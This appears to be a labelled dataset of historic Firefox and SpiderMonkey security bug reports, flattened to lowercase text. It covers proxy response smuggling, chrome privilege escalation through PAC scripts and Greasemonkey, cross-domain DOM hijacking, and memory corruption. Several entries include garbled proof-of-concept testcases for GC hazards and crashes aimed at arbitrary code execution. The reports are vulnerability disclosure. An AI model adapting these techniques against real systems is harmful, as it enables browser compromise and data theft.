content injection spoofing with a combination of headers defined by http/1.0 and 1.1 e.g content-length and transfer-encoding chunked user-agent mozilla/5.0 macintosh u ppc mac os x mach-o en-us rv:1.8.0.1 gecko/20060111 firefox/1.5.0.1 build identifier n/a note this bug was originally reported to ipa information-technology promotion agency japan and forwarded to us at mozilla japan i m not original reporter do n't mention my name in the security advisory for more information about ipa visit jvn28513736 attackers can forge a web page on another domain by sending the http response including content-length header and transfer-encoding chunked header this could be used for the real phishing to steal sensitive data such as user password or cookies windows xp professional sp2 mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9a1 gecko/20060129 firefox/1.6a1 reproducible sometimes steps to reproduce 1 set up firefox to use squid/2.5.stable12 for http proxy 2 configure squid set the value of persistent_request_timeout to 1 minute 2 provide the proxy with http response with the following conditions a content-length header is included b transfer-encoding chunked is included c response length with chunk size data of b is shorter than the value of a actual results squid conforms to http/1.0 not to http/1.1 therefore it will send data of the number of bytes specified by content-length header to the browser transfer-encoding header with a space will be transferred as is this is appropriate behavior compliant with http/1.0 firefox will receive the response via proxy and handle the response body based on transfer-encoding header firefox determines the termination of message body based on the last chunk of chunked encoding not content-length the rest of response determined by the condition c is incorrectly recognized as the response of following http request expected results the rest of response should not be recognized as the response of following http request additional information the malicious web site admins can target firefox users who use http proxy that keep-alive anabled to steal cookies or build web pages including fake login form for arbitrary domains original reporter says that firefox does n't ignore the header that is n't part of http/1.0 but is defined by http/1.1 when it interprets http/1.0 response although this report makes an issue of transfer-encoding header but other headers might be a problem reporter also says firefox should be implemented not to reuse stream that is connected to the http proxy when it starts connection to another web server workaround for squid admins disable keep-alive	11
valueof.call causes privilege escalation issue in greasemonkey greasemonkey 0.6.4 on fx1.5 greasemonkey provides some api functions gm to allow user scripts to do some certain privileged operations gm proto__.__proto__.__parent is greasemonkey s component s compilation scope that is a backstagepass object accessing proto and parent properties are protected by access check but valueof.call can be used to circumvent the access check once a user script reaches the backstagepass a user script can run arbitrary code with chrome privileges by using greasemonkey s non-api functions e.g gm_hitch ge etc a user script that calls content-defined function or getter/setter allows content to access the sandbox and greasemonkey s api functions on the sandbox in such case content can combine these two flaws to run arbitrary code with chrome privileges for example and are exploitable greasemonkey 0.5.3 on fx1.0.7 also exploitable almost same as 0.6.4 difference in 0.5.3 greasemonkey s functions compilation scope is nsxulprototypescript compilation scope when the first time greasemonkey and user script are installed greasemonkey s non-api functions are n't accessible until firefox restarts and if xul cache is disabled the functions do n't become accessible but in such case function constructor can be used to run arbitrary code the security check for function constructor has been added on fx1.5 and should be ported to 1.0.x	2
malicious pac script can escalate privilege on firefox 1.0.7 and mozilla 1.7.12 within the function findproxyforurl this refers to the nsproxyautoconfig component s compilation scope that is a backstagepass object thus a pac script can run arbitrary code with chrome privileges by using privileged functions in the backstagepass on firefox 1.5 and trunk within the function findproxyforurl this refers to the nsproxyautoconfig object thus a pac script can run arbitrary code with chrome privileges by using privileged functions of the nsproxyautoconfig object note even if this issue is fixed a pac script can still use valueof.call trick bug 312871 to access the backstagepass and run arbitrary code steps to reproduce 1 setup a pac file testcase on web server or save it to local hard disk 2 set automatic proxy configuration url to its url 3 open any web site an alert dialog that shows components.stack will appear	2
dynamic this binding is biting pac i m splitting this bug off of bug 321101 since there are two bugs reported there and they re unrelated this bug is about attachment 206496 details which i described as simple highway robbery moz_bug_r_a4 s clever testcase exploits the fact that when we call findproxyforurl this is the nsproxyautoconfig object itself and since there are n't any security checks once you re in js-only land the evil pac script is able to trick the proxy auto config object into calling eval with its evil code oh how i hate seeing components.stack in an alert	2
fix for bug 319263 can be bypassed by calling valueof via a local variable js_safecomputethis is used in fun_call fun_apply and array_extra thus it is possible to bypass access checks by calling valueof via a local variable function a var f fun.valueof var x f a var g fun.valueof global variable var y g x is the global object that created fun y is the global object in the current context	2
crash when browse this site over top menu nsglobalwindow runtimeout user-agent mozilla/5.0 windows u windows nt 5.1 de rv:1.8 gecko/20051111 firefox/1.5 build identifier mozilla/5.0 windows u windows nt 5.1 de rv:1.8 gecko/20051111 firefox/1.5 browser crash when you browse the site over the top menu or when you go to other site in this tab i test on 1.5 see build identifier and last 1.6a2 from 20.12.05 with clear profile reproducible always steps to reproduce 1.www.scriptinternals.de 2.over top menu goto download systemscripter 6.0 3.wait or to next page or new site in same tap	11
memory corruption with simultaneous events sa19873 cve-2006-3113 secunia research has discovered a vulnerability in mozilla firefox 1.5 branch which can be exploited by malicious people to compromise a user s system the vulnerability is caused due to an memory corruption error within the handling of simultaneously happening xpcom events this may be exploited to execute arbitrary code on a user s system when a malicious website is visited we have confirmed the vulnerability in versions 1.5.0.1 1.5.0.2 1.5.0.3 and 1.5.0.4 on windows and version 1.5.0.4 on linux the 1.0.x branch does not seem affected i ve included a poc final_crash_poc.zip that crashes the browser unpack the files open 1.htm and follow the directions we do n't know the exact location of the error s but i ve included some gdb output from the crash and ida output below gdb output mozilla/5.0 x11 u linux i686 en-gb rv:1.8.0.4 gecko/20060508 firefox/1.5.0.4 program received signal sigsegv segmentation fault switching to thread 1208891712 lwp 7295 in nsreadingiterator unsigned short advance gdb bt 0 in nsreadingiterator unsigned short advance 1 in nsreadingiterator unsigned short advance 2 in nstimerimpl fire from usr/lib/firefox/libxpcom_core.so 3 in handletimerevent from usr/lib/firefox/libxpcom_core.so 4 in pl_handleevent from usr/lib/firefox/libxpcom_core.so 5 in pl_processpendingevents from usr/lib/firefox/libxpcom_core.so 6 in nseventqueueimpl checkfordeactivation from usr/lib/firefox/libxpcom_core.so 7 in xmlinitunknownencodingns 8 in g_vasprintf from usr/lib/libglib-2.0.so.0 9 in g_main_context_dispatch from usr/lib/libglib-2.0.so.0 10 in g_main_context_acquire from usr/lib/libglib-2.0.so.0 11 in g_main_loop_run from usr/lib/libglib-2.0.so.0 12 in gtk_main from usr/lib/libgtk-x11-2.0.so.0 13 in xmlinitunknownencodingns 14 in nsxptcvariant init 15 in 16 in 17 in 18 in gdb i r eax 1768714352 ecx 1207330739 edx 1952412517 ebx 267699 esp ebp esi 0 edi 3 eip eflags 66195 cs 115 ss 123 ds 123 es 123 fs 0 gs 51 gdb x/i eip zn17nsreadingiteratorite7advanceei+733304 mov edi edx as mentioned in the poc program flow is sometimes directed to a location in firefox.exe on windows that allows code execution the following ida output from mozilla firefox 1.5.0.4 shows this location text:00552660 sub_552660 text:00552660 var_c dword ptr 0ch text:00552660 var_8 dword ptr 8 text:00552660 var_4 dword ptr 4 text:00552660 text:00552660 push ecx text:00552661 push ecx text:00552662 push ebx text:00552663 push ebp text:00552664 push esi text:00552665 mov ebx ecx text:00552667 call sub_5445f4 text:0055266c lea ebp ebx+0d8h text:00552672 mov esp+14h+var_8 eax text:00552676 mov esi ebp+0 text:00552679 test esi esi text:0055267b jz short exit text:0055267d push edi text:0055267e text:0055267e loc_55267e code xref sub_552660+69j text:0055267e cmp ebx+14h esi text:00552681 jnz short loc_552689 text:00552683 mov ebx+0dch ebp text:00552689 text:00552689 loc_552689 code xref sub_552660+21j text:00552689 mov eax esi+3ch text:0055268c lea edi esi+0ch edi ptr to user-controlled data text:0055268f mov esp+18h+var_4 eax text:00552693 mov eax edi eax 4 user-controlled bytes unicode text:00552695 test eax eax text:00552697 jz short loc_5526b4 text:00552699 mov ecx eax ecx user-controlled address text:0055269b push eax text:0055269c call dword ptr ecx+18h calling user-controlled code text:0055269c normally calls xpcom_core.dll the common vulnerabilities and exposures cve project has assigned cve-2006-3113 for the vulnerability we have reserved sa19873 for the vulnerability please let us know when you expect to issue an updated version and keep us updated on your progress	11
needssecuritycheck incorrect for top-level scripts steps to reproduce 1 load the testcase 2 open dom inspector 3 click the html element in the node tree pane 4 select javascript object mode in the right pane result custom iterator called alert appears and the normal properties of the object are n't listed in dom inspector	2
native dom methods can be hijacked across domain security boundaries allowing cross-domain scripting user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.0.4 gecko/20060508 firefox/1.5.0.4 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.0.4 gecko/20060508 firefox/1.5.0.4 a page on foo.com can load bar.com in an iframe or object element and then change the native dom methods inside that third-party document despite that this should be prevented through domain security boundaries this allows cross-domain scripting i originally posted this information in a post to the bugtraq mailing list from that post ordinarily when you have a window object containing a document from a thirdparty domain such as iframe id thirdparty src iframe you are not allowed to reference any kind of objects inside this window using a dom 0 approach window.frames 0 contentdocument will give you a security exception however reading the contentdocument property of the dom element instead of the through the frames collection will give you a reference to the document object inside the thirdparty domain and even allow you to overwrite native dom methods without throwing a security exception such as document.getelementbyid thirdparty contentdocument.getelementbyid=function s alert s this also holds true for window.frames 0 document.getelementsbytagname and any other methods on the document object functionally the document and contentdocument properties both reference the same object and should obey the same security context rules however firefox differentiates based on how you reference that object and thus allows you to overwrite native dom methods on a thirdparty domain broadening the potential attack scope by allowing you to interfere with the operations of existing script code inside that thirdparty document reproducible always steps to reproduce 1 create an html document on foo.com that contains an iframe or object referencing bar.com 2 reference the contentdocument object on the iframe or object element 3 this should throw a security exception but does not actual results i was able to overwrite any native dom methods on the third-party document such as getelementbyid and getelementsbytagname thereby interfering with the ordinary operation of script code in that document expected results firefox should throw a security exception when i try to reference the contentdocument object on any kind of third-party document this is also the actual result in internet explorer 4 5 and 6	2
eip hijack in ff 1.5.0.5 crash called by js_setprivate from h d moore hdm metasploit.com this bug is really annoying to track down it seems like changing anything in the script prevents the eip hijack from working hope it works for you i can reliably reproduce here windows xp sp2 ff 1.5.0.4 hd a18.470 access violation code c0000005 second chance eax=20202020 ebx=00000000 ecx=20202020 edx=022e5308 esi=022e5310 edi=022e5308 eip=20202113 esp=0012d7c4 ebp=0012d7e8 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202 error module load completed but symbols could not be loaded for c windows\system32\xpsp2res.dll xpsp2res 20202113 008000000606 add eax al ds:0023:26262020 0:000 k childebp retaddr warning stack unwind information not available following frames may be wrong 0012d7e8 60082df1 xpsp2res 0012d834 6009c92d js3250 js_setprivate 0012d864 60082a79 js3250 js_getsrcnoteoffset 0012d8a4 6009c148 js3250 js_initclass 0012d8e0 60081fd4 js3250 js_getsrcnoteoffset 0012d90c 60082321 js3250 js_setglobalobject warning unable to verify checksum for c program files\mozilla firefox\firefox.exe error symbol file could not be found defaulted to export symbols for c program files\mozilla firefox\firefox.exe 0012d928 0041021f js3250 js_resolvestandardclass 0012d940 600addd2 firefox ns_registrygetfactory 0012d980 600ada90 js3250 js_lookupproperty 0012d9a0 600ae29d js3250 js_lookupproperty 0012d9e0 004162e7 js3250 js_findproperty 0012da20 00416243 firefox ns_registrygetfactory 0012da4c 0040ce48 firefox ns_registrygetfactory 0012dae0 0040cfb3 firefox ns_registrygetfactory 0012db98 005364c5 firefox ns_registrygetfactory 0012dbd8 00536e34 firefox nsprintoptions getnewprintsettings 0012dbf4 005f298c firefox nsprintoptions getnewprintsettings 0012dc24 00732737 firefox devicecontextimpl getcanonicalpixelscale 0012dc4c 007247a5 firefox nsprintsettings addref error symbol file could not be found defaulted to export symbols for c program files\mozilla firefox\xpcom_core.dll 0012dc90 60311954 firefox nsprintsettings getprintoptionsbits see attached testcase i was able to reproduce this exploit using ff 1.5.0.4 and the pre-release version of ff 1.5.0.5 from today july 14	11
crash kernel32.dll commonconstructor with testcase using geckoactivexobject see upcoming testcase this crashes firefox1.5.0.5rc3 and current trunk builds current trunk builds probably crash already earlier because of bug 344957 talkback id tb21052037q kernel32.dll cxxthrowexception com_error com_error com_issue_error commonconstructor c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcidispatchextension.cpp line 90 activexconstructor c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcidispatchextension.cpp line 131 js_invoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1188 js_interpret c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 3584 js_invoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1208 js_internalinvoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1285 js_callfunctionvalue c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsapi.c line 4177 nsjscontext calleventhandler c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/dom/src/base/nsjsenvironment.cpp line 1411 nsjseventlistener handleevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/dom/src/events/nsjseventlistener.cpp line 195 nseventlistenermanager handleeventsubtype c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/content/events/src/nseventlistenermanager.cpp line 1687 nseventlistenermanager handleevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/content/events/src/nseventlistenermanager.cpp line 1788 nsgenericelement handledomevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/content/base/src/nsgenericelement.cpp line 2185 nshtmlbuttonelement handledomevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/content/html/content/src/nshtmlbuttonelement.cpp line 336 presshell handleeventinternal c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nspresshell.cpp line 6379 presshell handleeventwithtarget c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nspresshell.cpp line 6277 nseventstatemanager checkforanddispatchclick c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/content/events/src/nseventstatemanager.cpp line 3048 nseventstatemanager posthandleevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/content/events/src/nseventstatemanager.cpp line 2026 presshell handleeventinternal c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nspresshell.cpp line 6451 presshell handleevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nspresshell.cpp line 6215 nsviewmanager handleevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/view/src/nsviewmanager.cpp line 2559 nsviewmanager dispatchevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/view/src/nsviewmanager.cpp line 2246 handleevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/view/src/nsview.cpp line 174 nswindow dispatchevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/widget/src/windows/nswindow.cpp line 1258 nswindow dispatchmouseevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/widget/src/windows/nswindow.cpp line 6028 childwindow dispatchmouseevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/widget/src/windows/nswindow.cpp line 6279 nswindow windowproc c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/widget/src/windows/nswindow.cpp line 1440 user32.dll user32.dll user32.dll user32.dll nsappshell run c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/widget/src/windows/nsappshell.cpp line 159 nsappstartup run c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/toolkit/components/startup/src/nsappstartup.cpp line 151 main c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/browser/app/nsbrowserapp.cpp line 61 kernel32.dll	11
gc hazard during namespace scanning deutschschorrwaite from gc.c which used to gc during low stack condition does not scan xml-related objects for their gc things in particular it contains the following code in lines 1425 1435 if jsval_is_object v vp jsval_settag top jsval_boolean top parent if scope scope dswindex encodedswindex vp obj slots goto down handle string and double gc-things mark_gc_thing cx thing flagp null where goto down caused interpreting v as normal object and scanning only its obj slots since jsval_is_object returns true for xml objects xml-specific scanning is ignored here is a test case for js-shell to demonstrate the problem function prepare n var xml xml for var i 0 i 2 i var ns new namespace i ns.property a:1 xml.addnamespace ns prepare list to trigger deutschschorrwaite call during gc cursor xml for var i 0 i n i if i 2 0 cursor a 1 cursor else cursor cursor a 1 return cursor function check list n extract xml to verify for var i n i 0 i list list i 2 var xml list if typeof xml xml return false var array xml.inscopenamespaces if array.length 3 return false if property in array 0 return false if array 1 property.a 1 return false if array 2 property.a 1 return false return true var n 2000 var list prepare n gc var ok check list n print ok when run in the debug build js shell with stack limit set to 100k it generates segfault w/js/mozilla/js/src js s 102400 test.js before 40122 after 39915 break 0993a000 segmentation fault since this bug can be used to subvert type of gc references from the script a script can use this to trigger arbitrary code execution using approach described in c10	11
jsxml.c bad assumptions about js_constructobject 1 in several places when constructing qname and namespace instances the code form jsxml.c assumes that the result of js_constructobject is proper qname/namespace object but since qname and namespace constructors can be replaced or hidden via with statement that assumption is wrong here is a trivial example that demon strates the bug js qname function xml elements segmentation fault the bug allows for example for a script for cast as a pointer to jsxmlnamespace or jsxmlqname a pointer to jsscript this would lead to reading of pointer to in terpreter bytecode as a pointer to jsobject given the rather dense nature of the bytecode this provides a wide range of possible value 2 toxmlname calls js_constructobject with a pointer to jsval as argument array since jsval is constructed from valuetostring it can be rooted only through last internalresult with prototype getter defined that can be made unrooted and gc-ed after which it would be passed to the constructor	11
gc hazards in constructor functions the object allocated at jsscript.c:878 is not rooted properly thus it might be gc-ed in the following script_compile call file and regexp constructors also have similar issues 873 static jsbool 874 script jscontext cx jsobject obj uintn argc jsval argv jsval rval 875 876 if not constructing replace obj with a new script object 877 if cx fp flags jsframe_constructing 878 obj js_newobject cx js_scriptclass null null 879 if obj 880 return js_false 881 882 return script_compile cx obj argc argv rval 883 2170 4045 877	11
scanner memory exposure to scripts the code of getxmlentity from jsscan.c contains the following code bp ts tokenbuf.base offset fastappendchar ts tokenbuf bytes js_deflatestring cx bp 1 ptrdiff ts tokenbuf.ptr bp jschar 2 this does not take into account that fastappendchar may grow and reallocate the buffer when such reallocation happens ts tokenbuf.ptr bp can be an arbitrary number if js_deflatestring can allocate and access the corresponding region of memory bytes would be c string corresponding to this arbitrary number of characters then this string would be embedded in the throw error object that the script can catch and read since in principle this could allow to read various bytes that travels through arena area via catching from script the thrown error object i mark this as security problem	11
crashes within 10-20 deep recursion of marksharpobjects i looked at the crashes in firefox 1.5.0.4 out of the last 500 talkback reports there were 7 such crashes 1 linux 6 windows many of the windows ones show up as xpsp2res.dll due to the base address the bottom of the stack was always identical except for the platform variation in how nstimerimpl fire is called marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 js_entersharpobject c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 539 js_obj_tosource c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 672 js_invoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1188 js_internalinvoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1285 js_trymethod c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 4073 js_valuetosource c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsstr.c line 2804 str_uneval c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsstr.c line 477 js_interpret c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 3584 js_invoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1208 fun_apply c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsfun.c line 1669 js_invoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1188 js_interpret c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 3584 js_invoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1208 js_interpret c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 3584 js_invoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1208 fun_apply c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsfun.c line 1669 js_invoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1188 js_interpret c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 3584 js_invoke c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsinterp.c line 1208 nsxpcwrappedjsclass callmethod c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcwrappedjsclass.cpp line 1373 nsxpcwrappedjs callmethod c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcwrappedjs.cpp line 462 sharedstub c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/xpcom/reflect/xptcall/src/md/win32/xptcstubs.cpp line 147 nstimerimpl fire c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/xpcom/threads/nstimerimpl.cpp line 407 nsappstartup run c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/toolkit/components/startup/src/nsappstartup.cpp line 151 main c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/browser/app/nsbrowserapp.cpp line 61 but the top of the stack varies a bit as does the number of levels of marksharpobjects recursion examples are xpsp2res.dll js_getreservedslot c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsapi.c line 3328 rewrapifdeepwrapper c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcnativewrapper.cpp line 294 xpc_nw_getorsetproperty c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcnativewrapper.cpp line 588 xpc_nw_getproperty c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcnativewrapper.cpp line 595 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 472 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 and xpsp2res.dll js_getreservedslot c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsapi.c line 3328 xpc_nw_addproperty c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcnativewrapper.cpp line 248 js_definenativeproperty c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 2567 js_defineproperty c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 2452 defineucproperty c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsapi.c line 2383 js_defineucproperty c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsapi.c line 2787 nswindowsh newresolve c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/dom/src/base/nsdomclassinfo.cpp line 5793 xpc_nw_newresolve c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcnativewrapper.cpp line 756 js_lookuppropertywithflags c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 2738 js_lookupproperty c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 2643 xpc_nw_enumerate c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcnativewrapper.cpp line 631 js_enumerate c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 3495 js_enumerate c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsapi.c line 3076 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 442 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 marksharpobjects c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/js/src/jsobj.c line 482 the deep recursion in marksharpobjects seems suspicious to me although maybe there s a good reason for it this seems like something gc_mark_debug might catch perhaps there s nothing in the test suite testing tosource on objects that have getters and setters within them	11
gc hazard with for-in loop the implementation of for-in loop during the initialization creates an array holding object properties however no efforts is taken to protect the array against gc thus if a property from the array is deleted during the loop execution and gc is triggered the gc-ed property would be accessed during the following iterations the following example demonstrates the problem and triggers a segfault in jsshell and browser var obj var prop xsomepropety substr 1 obj.first first obj prop 1 for var elem in obj var tmp elem.tostring delete obj prop ensure that prop is cut from all roots prop xsomepropety substr 2 obj prop 2 delete obj prop prop null if typeof gc function gc for var i 0 i 50000 i var tmp 1 3 tmp 10	11
gc hazards in jsarray.c unrooted atoms for large index in many places spidermonkey code assumes that potential gc calls would not collect atoms unfortunately this is not true since the branch callback is allowed to call js_maybegc/js_forcegc which would collect unrooted atoms the following example demonstrates the problem for the browser/shell var n var a a n 1 1 a.__definegetter n 1 function var tmp tmp n 2 0 if typeof gc function gc for var i 0 i 50000 i var tmp 1 3 tmp 10 for var i 0 i 1000 i make string with 11 characters that would take 11 1 2 bytes or sizeof jsatom so eventually malloc will ovewrite just freed atoms var tmp2 array 12 join return 10 the following always-throw getter is to stop unshift from doing 2^32 iterations var tostop stringtostop a n 3 0 a.__definegetter n 3 function throw tostop var good false try a.unshift 1 catch e if e tostop good true when embedded in a script tag it crashes the browser	11
probably an integer overflow in js_obj_tosource there is probably an integer overflow in js_obj_tosource var o f1 r f2 r f3 r f4 r f5 r f6 r f7 r f8 r f9 r var rr=o.tosource where r occupies 512mb causes this crash 4 in nanosleep from lib/tls/libc.so.6 5 in sleep from lib/tls/libc.so.6 6 in ah_crap_handler signum=11 at nssighandlers.cpp:133 7 in nsprofilelock fatalsignalhandler signo=11 at nsprofilelock.cpp:210 8 signal handler called 9 in quotestring sp str quote=34 at opt/joro/firefox/mozilla/js/src/jsopcode.c:438 10 in js_quotestring cx str quote=34 at opt/joro/firefox/mozilla/js/src/jsopcode.c:496 11 in js_valuetosource cx v=143646180 at opt/joro/firefox/mozilla/js/src/jsstr.c:2697 12 in js_obj_tosource cx obj argc=0 argv rval at opt/joro/firefox/mozilla/js/src/jsobj.c:869 13 in js_invoke cx argc=0 flags=0 at opt/joro/firefox/mozilla/js/src/jsinterp.c:1300 14 in js_interpret cx pc result at opt/joro/firefox/mozilla/js/src/jsinterp.c:3955 memory usage is about 600mb and probably can be made smaller	11
